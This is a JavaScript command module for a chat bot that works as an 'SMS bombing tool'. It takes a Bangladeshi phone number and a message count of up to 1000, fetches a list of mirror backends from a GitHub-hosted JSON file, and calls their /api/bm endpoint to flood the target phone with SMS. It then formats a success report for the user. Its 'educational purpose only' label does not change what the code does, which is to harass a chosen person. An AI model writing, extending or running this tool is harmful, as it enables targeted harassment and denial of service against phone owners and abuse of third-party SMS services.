const axios = require('axios');

// Remote API list (all point to same backend, just mirrors)
const APIS_JSON_URL = "https://raw.githubusercontent.com/eshitax/shadowx-apis/refs/heads/main/apis.json";

// Cached API list
let API_LIST = [];
let API_LIST_LAST_FETCH = 0;
const API_LIST_TTL = 5 * 60 * 1000; // 5 min

async function getApiList() {
  const now = Date.now();
  if (API_LIST.length && (now - API_LIST_LAST_FETCH) < API_LIST_TTL) {
    return API_LIST;
  }
  try {
    const { data } = await axios.get(APIS_JSON_URL, { timeout: 10000 });
    let list = [];

    if (Array.isArray(data)) {
      list = data;
    } else if (data && typeof data === "object") {
      if (Array.isArray(data.apis)) list = data.apis;
      else if (Array.isArray(data.urls)) list = data.urls;
      else if (Array.isArray(data.api)) list = data.api;
      else list = Object.values(data).filter(v => typeof v === "string");
    }

    list = list
      .filter(u => typeof u === "string" && /^https?:\/\//.test(u))
      .map(u => u.replace(/\/+$/, ""));

    if (list.length) {
      API_LIST = list;
      API_LIST_LAST_FETCH = now;
      return API_LIST;
    }
  } catch (e) {
    console.log("⚠️ Failed to fetch APIs JSON:", e.message);
  }
  return API_LIST;
}

// Try all APIs in order; return first successful response
async function tryAllApis(buildPath, timeout = 1200000) {
  const apis = await getApiList();
  if (!apis.length) throw new Error("No APIs available (could not load API list)");

  let lastErr = null;

  for (const base of apis) {
    const url = `${base}${buildPath}`;
    try {
      console.log("📱 Trying SMB API:", url);
      const { data } = await axios.get(url, {
        timeout,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });
      if (data && data.success !== false) {
        console.log("✅ Success from:", base);
        return { data, base };
      }
      console.log("⚠️ API returned unsuccessful:", base);
    } catch (e) {
      console.log("❌ API failed:", base, "-", e.message);
      lastErr = e;
    }
  }
  throw lastErr || new Error("All APIs failed");
}

module.exports = {
  config: {
    name: "smb",
    version: "3.0",
    author: "Mueid Mursalin Rifat",
    countDown: 5,
    role: 0,
    shortDescription: "SMS bombing tool",
    longDescription: "Send multiple SMS to a target number (Educational purpose only)",
    category: "tools",
    guide: {
      en: "{pn} <number> <count>\nExample: {pn} 01912345678 100"
    },
    aliases: ["smsbomb", "sbomb"]
  },

  onStart: async function({ api, event, args, message }) {
    try {
      if (args.length < 2) {
        return this.showHelp(message);
      }

      const number = args[0];
      const count = parseInt(args[1]);

      if (!this.isValidBangladeshiNumber(number)) {
        return message.reply(
          "❌ Invalid Bangladesh number!\n" +
          "📱 Format: 01XXXXXXXXX\n" +
          "💡 Example: 01912345678"
        );
      }

      if (isNaN(count) || count < 1 || count > 1000) {
        return message.reply(
          "❌ Invalid count!\n" +
          "📊 Range: 1-1000\n" +
          "💡 Example: 100"
        );
      }

      const processingMsg = await message.reply(
        `📱 𝐒𝐌𝐒 𝐁𝐨𝐦𝐛𝐢𝐧𝐠 𝐒𝐭𝐚𝐫𝐭𝐞𝐝\n\n` +
        `📞 𝐓𝐚𝐫𝐠𝐞𝐭: ${number}\n` +
        `🎯 𝐂𝐨𝐮𝐧𝐭: ${count}\n` +
        `⚡ 𝐒𝐭𝐚𝐭𝐮𝐬: Initializing...\n` +
        `⏳ 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭...`
      );

      const result = await this.sendSMSBomb(number, count);

      if (!result.success) {
        await api.unsendMessage(processingMsg.messageID);
        return message.reply(`❌ Failed: ${result.error || "Unknown error"}`);
      }

      const summary = result.data.summary;

      await api.editMessage(
        this.formatResults(summary, result.data, result.base),
        processingMsg.messageID
      );

    } catch (error) {
      console.error("SMB error:", error);
      await message.reply("❌ An error occurred. Please try again.");
    }
  },

  async sendSMSBomb(number, count) {
    try {
      const buildPath = `/api/bm?num=${encodeURIComponent(number)}&count=${count}`;
      const { data, base } = await tryAllApis(buildPath, 1200000);

      if (!data.success) {
        return {
          success: false,
          error: data.message || "API failed"
        };
      }

      return {
        success: true,
        data: data,
        base: base
      };

    } catch (error) {
      console.error("SMB API error:", error.message);
      return {
        success: false,
        error: error.message || "Network error"
      };
    }
  },

  formatResults(summary, fullData, base) {
    let text = `╭━━━━━━━━━━━━━━━━━━━━━╮\n`;
    text += `      📱 𝐒𝐌𝐒 𝐑𝐄𝐏𝐎𝐑𝐓 📱\n`;
    text += `╰━━━━━━━━━━━━━━━━━━━━━╯\n\n`;

    text += `📞 𝐓𝐚𝐫𝐠𝐞𝐭: ${summary.target}\n`;
    text += `🎯 𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐞𝐝: ${summary.requested}\n`;
    text += `✅ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥: ${summary.successful}\n`;
    text += `❌ 𝐅𝐚𝐢𝐥𝐞𝐝: ${summary.failed}\n`;
    text += `📊 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞: ${summary.success_rate_percent}\n\n`;

    text += `⏱️ 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: ${summary.duration_formatted}\n`;
    text += `🔄 𝐓𝐨𝐭𝐚𝐥 𝐀𝐭𝐭𝐞𝐦𝐩𝐭𝐬: ${summary.total_attempts}\n`;
    text += `⚡ 𝐀𝐏𝐈𝐬 𝐔𝐬𝐞𝐝: ${summary.apis_used}\n`;
    if (summary.average_time_per_message) {
      text += `⏰ 𝐀𝐯𝐞𝐫𝐚𝐠𝐞 𝐓𝐢𝐦𝐞: ${summary.average_time_per_message}ms\n\n`;
    } else {
      text += `\n`;
    }

    text += `📅 𝐒𝐭𝐚𝐫𝐭: ${new Date(summary.start_time).toLocaleTimeString()}\n`;
    text += `📅 𝐄𝐧𝐝: ${new Date(summary.end_time).toLocaleTimeString()}\n\n`;

    text += `⚠️ 𝐍𝐨𝐭𝐞: Educational purposes only\n`;
    text += `🔧 𝐀𝐏𝐈: ${base || "ShadowX-API"}\n`;
    text += `👨‍💻 𝐃𝐞𝐯: Mueid Mursalin Rifat`;

    return text;
  },

  isValidBangladeshiNumber(number) {
    if (typeof number !== 'string') return false;

    const cleanNumber = number.replace(/[^\d]/g, '');

    if (cleanNumber.length !== 11) return false;
    if (!cleanNumber.startsWith('01')) return false;

    const thirdDigit = parseInt(cleanNumber[2]);
    if (thirdDigit < 3 || thirdDigit > 9) return false;

    return true;
  },

  showHelp(message) {
    const helpText =
      `📱 𝐒𝐌𝐒 𝐁𝐨𝐦𝐛𝐢𝐧𝐠 𝐓𝐨𝐨𝐥\n\n` +
      `📝 𝐔𝐬𝐚𝐠𝐞:\n` +
      `• ${this.config.name} <number> <count>\n` +
      `• ${this.config.name} 01912345678 100\n\n` +
      `📋 𝐄𝐱𝐚𝐦𝐩𝐥𝐞𝐬:\n` +
      `• ${this.config.name} 01912345678 50\n` +
      `• ${this.config.name} 01812345678 500\n\n` +
      `⚠️ 𝐋𝐢𝐦𝐢𝐭𝐬:\n` +
      `• Number must be Bangladeshi (01XXXXXXXXX)\n` +
      `• Count: 1-1000 (max)\n` +
      `• Educational purpose only\n\n` +
      `🤖 𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐛𝐲: ShadowX-API\n` +
      `👨‍💻 𝐃𝐞𝐯: Mueid Mursalin Rifat`;

    return message.reply(helpText);
  }
};
